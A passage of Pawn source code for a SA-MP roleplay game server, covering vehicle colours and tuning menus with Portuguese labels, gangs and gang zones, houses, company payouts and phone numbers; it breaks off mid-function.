stock GetVehicleColours(vehicleid, &colour1, &colour2)
{
	new vfs, colours;
	
    if(IsServerVehicle(vehicleid))
    {
        colour1 = colour2 = 0;
	    return;
	}
	
	vfs = GetVehicleForSaleId(vehicleid);
	
	if(vfs != -1)
	{
	    colour1 = (VehiclesForSale[vfs][osColours] >> 16) & 0xFFFF;
		colour2 = (VehiclesForSale[vfs][osColours] & 0xFFFF);
		return;
	}
	
	colours = hGetInt(GetVehicleFilePath(vehicleid), "Colours");
	colour1 = (colours >> 16) & 0xFFFF;
	colour2 = (colours & 0xFFFF);
}

stock GetVehicleColoursEx(vehicleid)
{
	new vfs;
	
	if(IsServerVehicle(vehicleid))
	    return 0;

    vfs = GetVehicleForSaleId(vehicleid);

	if(vfs != -1)
		return VehiclesForSale[vfs][osColours];
	
	return hGetInt(GetVehicleFilePath(vehicleid), "Colours");
}

stock GetVehicles()
	return (MaxServerVeh + MaxPlayerVeh);

stock IsTrailerModel(modelid)
{
    for(new t = 0; t < sizeof Trailers; t++)
	{
		if(modelid == Trailers[t])
		    return true;
	}

	return false;
}

stock IsRCModel(modelid)
{
    for(new rc = 0; rc < sizeof RCs; rc++)
	{
		if(modelid == RCs[rc])
		    return true;
	}

	return false;
}

stock IsBikeModel(modelid)
{
	for(new bk = 0; bk < sizeof Bikes; bk++)
	{
		if(modelid == Bikes[bk])
		    return true;
	}
	
	return false;
}

stock IsAirModel(modelid)
{
    for(new air = 0; air < sizeof Airs; air++)
	{
		if(modelid == Airs[air])
		    return true;
	}

	return false;
}

stock IsBoatModel(modelid)
{
    for(new bt = 0; bt < sizeof Boats; bt++)
	{
		if(modelid == Boats[bt])
		    return true;
	}

	return false;
}

stock RandomCarModel()
{
	new m;

	do
	    m = random(sizeof Vehicles) + 400;
	while(Vehicles[m - 400][vehValue] <= 0 || IsBikeModel(m) || IsAirModel(m) || IsBoatModel(m) || IsRCModel(m) || IsTrailerModel(m));
	
	return m;
}

stock RandomBikeModel()
{
    new m;

	do
		m = Bikes[random(sizeof Bikes)] - 400;
	while(Vehicles[m][vehValue] <= 0);

	return m+400;
}

stock RandomAirModel()
{
    new m;

	do
		m = Airs[random(sizeof Airs)] - 400;
	while(Vehicles[m][vehValue] <= 0);

	return m+400;
}

stock RandomBoatModel()
{
    new m;

	do
		m = Boats[random(sizeof Boats)] - 400;
	while(Vehicles[m][vehValue] <= 0);

	return m+400;
}

stock IsValidVehicleComponent(componentid)
	return (componentid > 999 && componentid < 1194);

stock SaveVehicleComponent(vehicleid, componentid, slot)
{
	new vpath[128], key[128];
	new seek, value, mask, comp;

	vpath = GetVehicleFilePath(vehicleid);
	format(key, sizeof key, "Tun%d", slot / 4);
	value = hGetInt(vpath, key);
	
    seek = (slot % 4) * 8;
    comp = (componentid - 1000) & 0xFF;
    mask = ~(0xFF << seek);
	value = (value & mask) | (comp << seek);
	hSetInt(vpath, key, value);
}

stock GetVehicleComponent(vehicleid, slot)
{
    new vpath[128], key[128];
	new value, seek;

	vpath = GetVehicleFilePath(vehicleid);
	format(key, sizeof key, "Tun%d", slot / 4);
	value = hGetInt(vpath, key);
	
	seek = (slot % 4) * 8;
	return ((value >> seek) & 0xFF) + 1000;
}

stock DeleteVehicleComponent(vehicleid, slot)
	SaveVehicleComponent(vehicleid, 0xFF, slot);

stock LoadVehicleComponents(vehicleid)
{
	new vpath[128];
	new comp;
	
	vpath = GetVehicleFilePath(vehicleid);
	
	for(new slot = 0; slot < 18; slot++)
	{
	    comp = GetVehicleComponent(vehicleid, slot);
	    
	    if(comp != 0xFF)
	    {
	    	if(slot == HYDRAULICS)
	    	    ChangeVehiclePaintjob(vehicleid, comp);
	        
			else
				AddVehicleComponent(vehicleid, comp);
		}
	}
}

stock RemoveVehiclePaintjob(vehicleid)
{
	new colours, colour1, colour2, vfs;
	
	vfs = GetVehicleForSaleId(vehicleid);
	
	if(IsServerVehicle(vehicleid))
	    colours = ((random(300) & 0xFFFF) << 16) | (random(300) & 0xFFFF);
	    
	else if(vfs != -1)
	    colours = VehiclesForSale[vfs][osColours];
	
	else
		colours = hGetInt(GetVehicleFilePath(vehicleid), "Colours");
	
	colour1 = (colours >> 16) & 0xFFFF;
	colour2 = (colours & 0xFFFF);
	ChangeVehiclePaintjob(vehicleid, -1);
	ChangeVehicleColour(vehicleid, colour1, colour2);
}

stock ShowTuningMainMenu()
{
	new modelid, count;
	
	modelid = TuneData[2];
	count = 0;
	
	for(new t = 0; t < sizeof Tunes; t++)
	    Tunes[t] = -1;
	    
	DestroyMenu(mTuning);
	mTuning = CreateMenu("Componentes", 2, 20, 150, 100, 20);
	SetMenuColumnHeader(mTuning, 0, "Parte:");

	if(!IsValidMenu(mTuning))
		return -1;
	
	if(	modelid == 536 || modelid == 575 || modelid == 576 || modelid == 534 || modelid == 535 || modelid == 567 || modelid == 562 ||
		modelid == 565 || modelid == 558 || modelid == 559 || modelid == 560 || modelid == 561	)
	{
	    AddMenuItem(mTuning, 0, "Pintura");
	    Tunes[count++] = PAINTJOBS;
	}
	
	for(new m = 0; m < sizeof CarMods; m++)
	{
	    if(CarMods[m][0] == modelid)
	    {
	        for(new t = 1; t < 15; t++)
	        {
	            new slot;

				slot = GetComponentSlot(CarMods[m][t]);
	            
	            if(IsValidVehicleComponent(CarMods[m][t]) && slot != WHEELS && slot != NITROS && slot != STEREO && slot != HYDRAULICS)
	            {
					new bool:added;

					added = false;
					
					for(new c = 0; c < count; c++)
					{
					    if(slot == Tunes[c])
					        added = true;
					}
					
					if(!added)
					{
					    if(slot == SPOILERS)
					    {
					    	AddMenuItem(mTuning, 0, "Aerofolio");
					    	Tunes[count++] = SPOILERS;
						}
						
						else if(slot == ROOFSCOOPS)
					    {
					    	AddMenuItem(mTuning, 0, "Roofscoop");
					    	Tunes[count++] = ROOFSCOOPS;
						}
						
						else if(slot == HOODS)
					    {
					    	AddMenuItem(mTuning, 0, "Capo");
					    	Tunes[count++] = HOODS;
						}
						
						else if(slot == SIDESKIRTS)
					    {
					    	AddMenuItem(mTuning, 0, "Saias laterais");
					    	Tunes[count++] = SIDESKIRTS;
						}
						
						else if(slot == LAMPS)
					    {
					    	AddMenuItem(mTuning, 0, "Lampada");
					    	Tunes[count++] = LAMPS;
						}
						
						else if(slot == EXHAUSTS)
					    {
					    	AddMenuItem(mTuning, 0, "Escapamento");
					    	Tunes[count++] = EXHAUSTS;
						}
						
						else if(slot == BULLBARS)
					    {
					    	AddMenuItem(mTuning, 0, "Barras");
					    	Tunes[count++] = BULLBARS;
						}
						
						else if(slot == REARBULLBARS)
					    {
					    	AddMenuItem(mTuning, 0, "Barras traseiras");
					    	Tunes[count++] = REARBULLBARS;
						}
						
						else if(slot == FRONTBULLBARS)
					    {
					    	AddMenuItem(mTuning, 0, "Barras frontais");
					    	Tunes[count++] = FRONTBULLBARS;
						}
						
						else if(slot == FRONTBUMPERS)
					    {
					        AddMenuItem(mTuning, 0, "Parachoque frontal");
					        Tunes[count++] = FRONTBUMPERS;
					    }
					    
					    else if(slot == REARBUMPERS)
					    {
					        AddMenuItem(mTuning, 0, "Parachoque traseiro");
					        Tunes[count++] = REARBUMPERS;
					    }
					    
					    else if(slot == VENTS)
					    {
					        AddMenuItem(mTuning, 0, "Respiradouros");
					        Tunes[count++] = VENTS;
					    }
					    
					    else if(slot == FRONTSIGN)
					    {
					        AddMenuItem(mTuning, 0, "Sinal fronteiro");
					        Tunes[count++] = FRONTSIGN;
					    }
					}
				}
	        }
	        
	        break;
	    }
	}
	
	AddMenuItem(mTuning, 0, "Rodas");
	Tunes[count++] = WHEELS;
	AddMenuItem(mTuning, 0, "Nitro");
	Tunes[count++] = NITROS;
	AddMenuItem(mTuning, 0, "Estereo");
	Tunes[count++] = STEREO;
	AddMenuItem(mTuning, 0, "Hidraulica");
	Tunes[count++] = HYDRAULICS;
	
	ShowMenuForPlayer(mTuning, TuneData[0]);
	TogglePlayerControllable(TuneData[0], false);
	return 1;
}

stock ShowTuningSlotMenu()
{
    new count = 0;
	
    DestroyMenu(mTuning);
    mTuning = CreateMenu("Componentes", 2, 20, 150, 100, 20);
    SetMenuColumnHeader(mTuning, 0, "Componentes:");

	if(!IsValidMenu(mTuning))
 	    return -1;

	for(new t = 0; t < sizeof Tunes; t++)
	    Tunes[t] = -1;
	    
	switch(TuneData[3])
	{
	    case PAINTJOBS:
	    {
	        AddMenuItem(mTuning, 0, "Pintura 1");
			Tunes[count++] = 0;
			AddMenuItem(mTuning, 0, "Pintura 2");
			Tunes[count++] = 1;
			AddMenuItem(mTuning, 0, "Pintura 3");
			Tunes[count++] = 2;
		}
		
		case WHEELS, NITROS, STEREO, HYDRAULICS:
		{
		    for(new t = 0; t < sizeof Components; t++)
			{
 				if(Components[t][tuneSlot] == TuneData[3])
   				{
        	 		if(TuneData[3] == WHEELS)
        	 		{
        	 		    if(TuneData[4] != 500)
        	 		    {
        	 		        AddMenuItem(mTuning, 0, Components[t][tuneName]);
        	 		    	AddMenuItem(mTuning, 1, " ");
        	 				Tunes[count++] = t + 1000;
        	 		    
        	 		        if(count >= 10)
        	 		        {
        	 		            AddMenuItem(mTuning, 0, "Proximo");
           						AddMenuItem(mTuning, 1, "->");
              					Tunes[count++] = 500;
              					break;
        	 		        }
						}
						
						else
						{
						    count++;
						    
						    if(count >= 10)
						    {
						        AddMenuItem(mTuning, 0, Components[t][tuneName]);
        	 		    		AddMenuItem(mTuning, 1, " ");
        	 					Tunes[count - 10] = t + 1000;
							}
						}
        	 		}
        	 		
        	 		else
        	 		{
        	 		    AddMenuItem(mTuning, 0, Components[t][tuneName]);
        	 			Tunes[count++] = t + 1000;
        	 		}
	    		}
			}
			
			if(TuneData[3] == WHEELS && TuneData[4] == 500)
			{
			    AddMenuItem(mTuning, 0, "Anterior");
				AddMenuItem(mTuning, 1, "<-");
     			Tunes[count++] = 499;
			}
		}
		
		default:
		{
			for(new m = 0; m < sizeof CarMods; m++)
  			{
				if(CarMods[m][0] == TuneData[2])
				{
   					for(new t = 1; t < 15; t++)
			    	{
       					new comp;

						comp = CarMods[m][t];

					    if(!IsValidVehicleComponent(comp))
							break;

						if(GetComponentSlot(comp) == TuneData[3])
					    {
					        new bool:similar = false;

	            			for(new c = 0; c < count; c++)
		           			{
								if(!similar)
								{
	            	  				if(Tunes[c] == comp)
	            	  				{
                   						similar = true;
										break;
									}
									
		                			else
				            	    {
            	       					for(new s = 0; s < sizeof SimilarComponents; s++)
	        							{
 								        	if((SimilarComponents[s][0] == comp || SimilarComponents[s][1] == comp) && (SimilarComponents[s][0] == Tunes[c] || SimilarComponents[s][1] == Tunes[c]))
											{
 								        		similar = true;
 								        		break;
											}
				        				}
              						}
								}
				        	}

							if(!similar)
							{
			    				AddMenuItem(mTuning, 0, Components[comp - 1000][tuneName]);
     	 						Tunes[count++] = comp;
							}
						}
  					}
  					
		    		break;
				}
   			}
		}
	}

	ShowMenuForPlayer(mTuning, TuneData[0]);
	TogglePlayerControllable(TuneData[0], false);
	return 1;
}

stock ShowTuningCostMenu()
{
    DestroyMenu(mTuning);
    
	if(TuneData[3] == PAINTJOBS)
	{
		ChangeVehiclePaintjob(TuneData[1], TuneData[4]);
    	mTuning = CreateMenu("Pintura", 2, 20, 150, 100, 20);
    	
    	if(!IsValidMenu(mTuning))
    	    return -1;
    	    
    	SetMenuColumnHeader(mTuning, 0, "Pintura");
		SetMenuColumnHeader(mTuning, 1, "Valor:");
    	AddMenuItem(mTuning, 0, "Comprar");
    	AddMenuItem(mTuning, 1, "$1000");
    	AddMenuItem(mTuning, 0, "Cancelar");
    }
    
	else
	{
	    new s[32];

    	format(s, 32, "$%d", GetComponentValue(TuneData[4]));
    	AddVehicleComponent(TuneData[1], TuneData[4]);
		mTuning = CreateMenu("Componente", 2, 20, 150, 100, 20);
		
		if(!IsValidMenu(mTuning))
    	    return -1;
    	    
		SetMenuColumnHeader(mTuning, 0, Components[TuneData[4] - 1000][tuneName]);
		SetMenuColumnHeader(mTuning, 1, "Valor:");
		AddMenuItem(mTuning, 0, "Comprar");
		AddMenuItem(mTuning, 1, s);
		AddMenuItem(mTuning, 0, "Cancelar");
	}
    
    ShowMenuForPlayer(mTuning, TuneData[0]);
    TogglePlayerControllable(TuneData[0], false);
    return 1;
}

stock UpdateTuningMenu()
{
	if(TuneData[0] == INVALID_PLAYER_ID || TuneData[1] == -1 || TuneData[2] == -1)
	{
	    StopTuning();
	    return 1;
	}
	
	if(TuneData[3] == -1)
	{
	    if(ShowTuningMainMenu() == -1)
	    {
	        StopTuning();
			return -1;
		}
		
	    return 1;
	}
	
	if(TuneData[4] == -1 || TuneData[4] == 499 || TuneData[4] == 500)
	{
	    if(ShowTuningSlotMenu() == -1)
	    {
	        StopTuning();
			return -1;
		}
		
		TuneData[4] = -1;
	    return 1;
	}
		
	if(ShowTuningCostMenu() == -1)
	{
	    StopTuning();
		return -1;
	}
	
	return 1;
}

stock StopTuning()
{
	if(TuneData[1] != -1)
	{
	    LinkVehicleToInterior(TuneData[1], 0);
    	SetVehiclePos(TuneData[1], 1656.5331, -1826.1304, 13.6534);
    	SetVehicleZAngle(TuneData[1], 82.6385);
	}
	
	if(TuneData[0] != INVALID_PLAYER_ID)
	{
    	StopAudioStreamForPlayer(TuneData[0]);
		SetPlayerInterior(TuneData[0], 0);
		
		if(TuneData[1] != -1)
		    PutPlayerInVehicle(TuneData[0], TuneData[1], 0);
		    
		else
		    SetPlayerPos(TuneData[0], 1656.5331, -1826.1304, 13.6534);
		    
		SetCameraBehindPlayer(TuneData[0]);
		TogglePlayerControllable(TuneData[0], true);
	}
	
	TuneData[0] = INVALID_PLAYER_ID;
	TuneData[1] = -1;
	TuneData[2] = -1;
	TuneData[3] = -1;
	TuneData[4] = -1;
}

stock GetComponentValue(componentid)
{
    if(!IsValidVehicleComponent(componentid))
		return 0;

	return Components[componentid - 1000][tuneValue];
}

stock GetComponentSlot(componentid)
{
	if(!IsValidVehicleComponent(componentid))
		return -1;
		
	return Components[componentid - 1000][tuneSlot];
}

stock CreateGang(const name[], leaderid, colour)
{
	new gpath[128];
	new id;
	
	id = 1;
	gpath = GetGangFilePath(id);
	    
	while(fexist(gpath))
	{
	    if(hGetInt(gpath, "Deleted") == 1)
		    break;
		    
	    id++;
	    gpath = GetGangFilePath(id);
	}
	
	if(ColourType == COLOUR_TYPE_GANG)
	{
 		new alpha;

		alpha = GetPlayerColour(leaderid) & 0xFF;
  		SetPlayerColour(leaderid, (GangColours[colour][gColourHex] & 0xFFFFFF00) | alpha);
	}
	    
	hSetString(gpath, "Name", name);
	hSetInt(gpath, "Colour", colour);
	hSetInt(gpath, "Deleted", 0);
	hSetInt(gpath, "Conquered", 0);
	PutPlayerInGang(leaderid, id, GANG_POST_LEADER);
	return id;
}

stock GetGangColour(gangid)
	return GangColours[hGetInt(GetGangFilePath(gangid), "Colour")][gColourHex];
    
stock GetGangID(const name[])
{
	new gpath[128];
	new id;
	
	id = 1;
	gpath = GetGangFilePath(id);
	
	while(fexist(gpath))
	{
	    if(hGetInt(gpath, "Deleted") == 0 && strcmp(hGetString(gpath, "Name"), name, true) == 0)
	        return id;
	        
	    id++;
	    gpath = GetGangFilePath(id);
	}
	
	return -1;
}
	
stock PutPlayerInGang(playerid, gangid, post)
	hSetInt(GANGS_FILE_PATH, PlayerName(playerid), (gangid << 5) | (post & 0x1F));

stock GetPlayerGangData(playerid, &id, &post)
{
	new data;
	
	data = hGetInt(GANGS_FILE_PATH, PlayerName(playerid));
	id = data >> 5;
	post = data & 0x1F;
}

stock GetPlayerGang(playerid)
{
    new data;
    
    data = hGetInt(GANGS_FILE_PATH, PlayerName(playerid));
    
	return data >> 5;
}

stock RemovePlayerFromGang(playerid)
	hUnset(GANGS_FILE_PATH, PlayerName(playerid));

stock UpdatePlayerZoneText(playerid)
{
	if(tdzone[playerid] == Text:INVALID_TEXT_DRAW)
	    return;

#if SHOW_GANGZONE_TEXT == true

    new string[128];
	new domain, zoneid;

    zoneid = Zone[playerid];
    domain = GetZoneDomain(zoneid);

	if(domain != 0)
	{
 		format(string, sizeof string, "~b~%s ~n~~l~%s%s", GangZones[zoneid][gzName], GangColours[hGetInt(GetGangFilePath(domain), "Colour")][gColourFormat], hGetString(GetGangFilePath(domain), "Name"));
 		
 		if(GangZones[zoneid][gzAttacker] != 0)
		    format(string, sizeof string, "%s ~n~~r~~h~vs ~n~~l~%s%s", string, GangColours[hGetInt(GetGangFilePath(GangZones[zoneid][gzAttacker]), "Colour")][gColourFormat], hGetString(GetGangFilePath(GangZones[zoneid][gzAttacker]), "Name"));
	}
	
	else
		format(string, sizeof string, "~b~%s ~n~~l~Território vazio", GangZones[zoneid][gzName]);

	TextDrawSetString(tdzone[playerid], TEXT(string));
	
#else

    TextDrawSetString(tdzone[playerid], "_");
    
#endif

}

stock SetZoneDomain(zoneid, id)
{
	new zkey[128];
	
	format(zkey, sizeof zkey, "Zone%d", zoneid);
	hSetInt(GANGZONES_FILE_PATH, zkey, id);
	
	for(new n = 0; n < MAX_SLOTS; n++)
	{
	    if(IsPlayerConnected(n) && IsPlayerLogged(n) && Zone[n] == zoneid)
			UpdatePlayerZoneText(n);
	}
	
	UpdateGangZone(zoneid);
}

stock GetZoneDomain(zoneid)
{
    new zkey[128];
    
    format(zkey, sizeof zkey, "Zone%d", zoneid);
	return hGetInt(GANGZONES_FILE_PATH, zkey);
}

stock RemoveZoneDomain(zoneid)
{
    new zkey[128];
    
	format(zkey, sizeof zkey, "Zone%d", zoneid);
	hUnset(GANGZONES_FILE_PATH, zkey);
	
	for(new n = 0; n < MAX_SLOTS; n++)
	{
	    if(IsPlayerConnected(n) && IsPlayerLogged(n) && Zone[n] == zoneid)
			UpdatePlayerZoneText(n);
	}
	
	UpdateGangZone(zoneid);
}

stock GetAreaGangZoneColour(area)
{
	return 	(area == AREA_FISH) ? COLOUR_FISHER :
	        (area == AREA_FARM) ? COLOUR_FARMER :
	        					  COLOUR_WHITE;
}

stock ShowGangZones(playerid)
{
    new domain;
    
    for(new a = 0, counter = 0; a < sizeof Areas && counter < AreasGangZones; a++)
    {
        if(Areas[a][areaGangZone] != INVALID_GANG_ZONE)
        {
            GangZoneShowForPlayer(playerid, Areas[a][areaGangZone], GetAreaGangZoneColour(Areas[a][areaId]));
            counter++;
        }
    }
    
	for(new z = 0; z < sizeof GangZones; z++)
	{
	    GangZoneStopFlashForPlayer(playerid, GangZones[z][gzId]);
	    GangZoneHideForPlayer(playerid, GangZones[z][gzId]);
	    
	    domain = GetZoneDomain(z);
	    
	    if(domain != 0)
	    {
			GangZoneShowForPlayer(playerid, GangZones[z][gzId], GetGangColour(domain) & 0xFFFFFF55);
			
			if(GangZones[z][gzAttacker] != 0)
		    	GangZoneFlashForPlayer(playerid, GangZones[z][gzId], COLOUR_RED);
		}
	}
}

stock UpdateGangZone(zoneid)
{
	new domain;
	
	GangZoneStopFlashForAll(GangZones[zoneid][gzId]);
	GangZoneHideForAll(GangZones[zoneid][gzId]);

	domain = GetZoneDomain(zoneid);
	
	if(domain != 0)
	{
	    GangZoneShowForAll(GangZones[zoneid][gzId], GetGangColour(domain) & 0xFFFFFF55);

		if(GangZones[zoneid][gzAttacker] != 0)
	    	GangZoneFlashForAll(GangZones[zoneid][gzId], COLOUR_RED);
	}
}

stock FinishWar(zoneid)
{
	GangZones[zoneid][gzAttacker] = 0;
	GangZones[zoneid][gzScore] = 0;
	DeleteTimer(GangZones[zoneid][gzTimer]);

	UpdateGangZone(zoneid);

	for(new n = 0; n < MAX_SLOTS; n++)
	{
 		if(IsPlayerConnected(n) && IsPlayerLogged(n) && Zone[n] == zoneid)
			UpdatePlayerZoneText(n);
	}
}

stock DeleteGang(id)
{
	new File:fpw, File:fpr;
	new data[128];
	new value, idx, gangid, post;

    if(ColourType == COLOUR_TYPE_GANG)
	{
		for(new n = 0; n < MAX_SLOTS; n++)
		{
		    GetPlayerGangData(n, gangid, post);
		    
		    if(gangid == id)
		    {
				new alpha;
				
				alpha = GetPlayerColour(n) & 0xFF;
				SetPlayerColour(n, (ColourValue & 0xFFFFFF00) | alpha);
		    }
		}
	}
	
	fpw = fopen("gangs.buf", io_write);
	fpr = fopen(GANGS_FILE_PATH, io_read);
	
	while(fread(fpr, data, sizeof data))
	{
	    idx = 0;
	    strtok(data, idx, HSYS_SEP_CHAR);
	    value = strval(strtok(data, idx));
	    gangid = value >> 5;
		post = value & 0x1F;
	    
		if(gangid != id)
		    fwrite(fpw, data);
	}
	
	fclose(fpw);
	fclose(fpr);
	
	if(fcopytextfile("gangs.buf", GANGS_FILE_PATH))
		fremove("gangs.buf");
		
	for(new z = 0; z < sizeof GangZones; z++)
	{
	    if(GetZoneDomain(z) == id)
	        RemoveZoneDomain(z);
	}
	
	hSetInt(GetGangFilePath(id), "Deleted", 1);
}

stock SaveHousePos(houseid, Float:X, Float:Y, Float:Z, Float:A)
{
	new str[128];
	format(str, sizeof str, "%.4f,%.4f,%.4f,%.4f", X, Y, Z, A);
	hSetString(GetHouseFilePath(houseid), "Position", str);
}

stock LoadHousePos(houseid, &Float:X, &Float:Y, &Float:Z, &Float:A)
{
	new str[128], idx = 0;

	str = hGetString(GetHouseFilePath(houseid), "Position");

	X = floatstr(strtok(str, idx, ','));
	Y = floatstr(strtok(str, idx, ','));
	Z = floatstr(strtok(str, idx, ','));
	A = floatstr(strtok(str, idx, ','));
}

stock CreateHouse(const owner[], value, Float:X, Float:Y, Float:Z, Float:A, onsale = 0)
{
	new hpath[128], id;
	
	id = 0;
	hpath = GetHouseFilePath(id);
	
	while(fexist(hpath))
	{
	    if(hGetInt(hpath, "Deleted") == 1)
		    break;
	    
	    id++;
	    hpath = GetHouseFilePath(id);
	}
	
	if(id > MAX_HOUSES)
	    return -1;
	    
	if(id >= MaxHouse)
	    MaxHouse = id + 1;
	    
	hSetString(hpath, "Owner", owner);
	hSetInt(hpath, "Value", value);
	hSetInt(hpath, "OnSale", onsale);
	hSetInt(hpath, "Deleted", 0);
	SaveHousePos(id, X, Y, Z, A);
	
	if(Houses[id][hPickup] != -1)
	    DestroyPickup(Houses[id][hPickup]);
	    
	Houses[id][hPickup] = CreatePickup((!onsale) ? 1272 : 1273, 1, X, Y, Z);
	return id;
}

stock PutHouseOnSale(id, onsale)
{
	new Float:X, Float:Y, Float:Z, Float:A;
	
	if(Houses[id][hPickup] != -1)
		DestroyPickup(Houses[id][hPickup]);

	LoadHousePos(id, X, Y, Z, A);
    Houses[id][hPickup] = CreatePickup((!onsale) ? 1272 : 1273, 1, X, Y, Z);
    hSetInt(GetHouseFilePath(id), "OnSale", onsale);
}

stock PutPlayerOnHouse(playerid, houseid)
{
	new Float:X, Float:Y, Float:Z, Float:A;
	
	LoadHousePos(houseid, X, Y, Z, A);
	SavePlayerPos(playerid, X, Y, Z, A);
	hSetInt(GetPlayerXFilePath(playerid), "House", houseid);
	UpdatePlayerSpawn(playerid);
}

stock GetPlayerHouse(playerid)
	return hGetInt(GetPlayerXFilePath(playerid), "House");

stock RemovePlayerFromHouse(playerid)
{
    SavePlayerPos(playerid, 1686.0055, -2239.6494, 13.5469, 176.8181);
    hSetInt(GetPlayerXFilePath(playerid), "House", -1);
	UpdatePlayerSpawn(playerid);
}

stock DeleteHouse(id)
{
    if(Houses[id][hPickup] != -1)
	    DestroyPickup(Houses[id][hPickup]);
	    
	Houses[id][hPickup] = -1;
	hSetInt(GetHouseFilePath(id), "Deleted", 1);
}

stock LoadHouses()
{
	new hpath[128];
	new id;
	new Float:X, Float:Y, Float:Z, Float:A;
	
	id = 0;
	hpath = GetHouseFilePath(id);
	
	while(id < MAX_HOUSES)
	{
	    if(!fexist(hpath))
	        break;
	        
		LoadHousePos(id, X, Y, Z, A);
		
		if(hGetInt(hpath, "Deleted") == 0)
			Houses[id][hPickup] = CreatePickup((!hGetInt(hpath, "OnSale")) ? 1272 : 1273, 1, X, Y, Z);
		else
		    Houses[id][hPickup] = -1;

		MaxHouse = id = id + 1;
		hpath = GetHouseFilePath(id);
	}
}

stock GetHouses()
	return (MaxHouse);
	
stock Employ(playerid, company, post, reward, payday)
	hSetInt(COMPANIES_FILE_PATH, PlayerName(playerid), ((company & 0xFF) << 24) | ((post & 0xF) << 20) | ((reward & 0xFFF) << 8) | ((payday / 100) & 0xFF));

stock EmployEx(playerid, data)
	hSetInt(COMPANIES_FILE_PATH, PlayerName(playerid), data);

stock GetPlayerCompanyData(playerid, &company, &post, &reward, &payday)
{
	new data;
	
	data = hGetInt(COMPANIES_FILE_PATH, PlayerName(playerid));
	company = (data >> 24) & 0xFF;
	post = (data >> 20) & 0xF;
	reward = (data >> 8) & 0xFFF;
	payday = (data & 0xFF) * 100;
}

stock GetCompanyUsedPercent(id)
{
    new File:fpr;
    new cpath[128], name[128], data[128];
	new value, idx, company, post, reward, percent;

	cpath = GetCompanyFilePath(id);
	fpr = fopen(COMPANIES_FILE_PATH, io_read);
	percent = 0;
	
	while(fread(fpr, data, sizeof data))
	{
	    idx = 0;
	    name = strtok(data, idx, HSYS_SEP_CHAR);
	    value = strval(strtok(data, idx));
	    company = (value >> 24) & 0xFF;
		post = (value >> 20) & 0xF;
		reward = (value >> 8) & 0xFFF;

	    if(company == id && post == COMPANY_POST_PARTNER)
			percent += reward;
	}

	fclose(fpr);
	return percent;
}

stock GetCompanyResult(id, &result)
{
	new cpath[128], owner[128];
	new balance, investment;

    result = 0;
	cpath = GetCompanyFilePath(id);
	owner = hGetString(cpath, "Owner");
	
	if(!strlen(owner))
		return 0;
		
	balance = hGetInt(cpath, "Balance");
	investment = hGetInt(cpath, "Investment");
	result = balance * (random(4) + 1);
	
	for(new proc = 0; proc < 8; proc++)
	{
		if(random(2) == 0)
  			result += (investment / 8) / (random(4) + 1) * (random(4) + 1);
  			
		else
		    result -= (investment / 8) / (random(4) + 10);
	}

	hSetInt(cpath, "Balance", 0);
	hSetInt(cpath, "Investment", 0);
	return 1;
}

stock SendCompanyResult(id, result)
{
	new File:fpr;
    new cpath[128], xpath[128], owner[128], name[128], data[128], prop[128], string[128];
	new value, idx, company, post, reward, total;
	
	cpath = GetCompanyFilePath(id);
	owner = hGetString(cpath, "Owner");
	fpr = fopen(COMPANIES_FILE_PATH, io_read);
	format(prop, sizeof prop, "%s \"%s\"", Companies[id][cType], Companies[id][cName]);
	
	while(fread(fpr, data, sizeof data))
	{
	    idx = 0;
	    name = strtok(data, idx, HSYS_SEP_CHAR);
	    value = strval(strtok(data, idx));
	    company = (value >> 24) & 0xFF;
		post = (value >> 20) & 0xF;
		reward = (value >> 8) & 0xFFF;
	    
	    if(company == id && post == COMPANY_POST_PARTNER)
	    {
	        new porc;
	        
	        xpath = GetPlayerNameXFilePath(name);
	        porc = (result * reward) / 100;
	        total += porc;
			hSetInt(xpath, "Bank", hGetInt(xpath, "Bank") + porc);
			
			if(result > 0)
				format(string, sizeof string, "[ A empresa gerou um lucro de $%d,00 dólares e sua porcentagem foi depositada em sua conta (Banco +$%d,00 dólares) ]", result, porc);

			else
	    		format(string, sizeof string, "[ A empresa gerou um prejuizo de $%d,00 dólares e sua porcentagem foi retirada da sua conta (Banco -$%d,00 dólares) ]", result, porc);

			SendPhoneMessage(name, prop, string);
	    }
	}
	
	fclose(fpr);
	
	total = result - total;
	xpath = GetPlayerNameXFilePath(owner);
	hSetInt(xpath, "Bank", hGetInt(xpath, "Bank") + total);
	
	if(result > 0)
		format(string, sizeof string, "[ A empresa gerou um lucro de $%d,00 dólares e o dinheiro foi depositado em sua conta (Banco +$%d,00 dólares) ]", result, total);
		
	else
	    format(string, sizeof string, "[ A empresa gerou um prejuizo de $%d,00 dólares e o dinheiro foi retirado da sua conta (Banco -$%d,00 dólares) ]", result, total);
	    
	SendPhoneMessage(owner, prop, string);
}

stock DeleteCompany(id)
{
	new File:fpw, File:fpr;
	new cpath[128], name[128], data[128], prop[128];
	new value, idx, company, post;

    cpath = GetCompanyFilePath(id);
	fpw = fopen("props.buf", io_write);
	fpr = fopen(COMPANIES_FILE_PATH, io_read);
	format(prop, sizeof prop, "%s \"%s\"", Companies[id][cType], Companies[id][cName]);

	while(fread(fpr, data, sizeof data))
	{
	    idx = 0;
	    name = strtok(data, idx, HSYS_SEP_CHAR);
	    value = strval(strtok(data, idx));
	    company = (value >> 24) & 0xF;
		post = (value >> 20) & 0xF;
		
		if(company != id)
		    fwrite(fpw, data);
		    
		else
		{
		    if(post == COMPANY_POST_EMPLOYEE)
		        SendPhoneMessage(name, prop, "[ A empresa encerrou suas atividades e voce agora nao e mais funcionario dela ]");
		        
		    if(post == COMPANY_POST_PARTNER)
		        SendPhoneMessage(name, prop, "[ A empresa encerrou suas atividades e voce agora nao e mais socio dela ]");
		}
	}

	fclose(fpw);
	fclose(fpr);

	if(fcopytextfile("props.buf", COMPANIES_FILE_PATH))
		fremove("props.buf");
		
    fremove(cpath);
}

stock Dismiss(playerid)
	hUnset(COMPANIES_FILE_PATH, PlayerName(playerid));
	
stock CreatePhone(const owner[])
{
	new cell_owner[128], number_key[128];
	new number;

	number = 1000 + random(20);
	valstr(number_key, number);
	cell_owner = GetPhoneOwner(number_key);

	while(strlen(cell_owner) != 0)
	{
	    number += random(20) + 1;
		valstr(number_key, number);
		cell_owner = GetPhoneOwner(number_key);
	}
	
	hSetString(PHONES_FILE_PATH, owner, number_key);
	return number;
}

stock GetPlayerPhone(playerid)
	return hGetInt(PHONES_FILE_PATH, PlayerName(playerid));

stock GetPhoneOwner(const number[])
{
    new File:fcell, data[128];
    
	fcell = fopen(PHONES_FILE_PATH, io_read);
	data[0] = '\0';
	
	while(fread(fcell, data, sizeof data))
	{
	    new buffer[128], sep;

        StripNewLine(data);
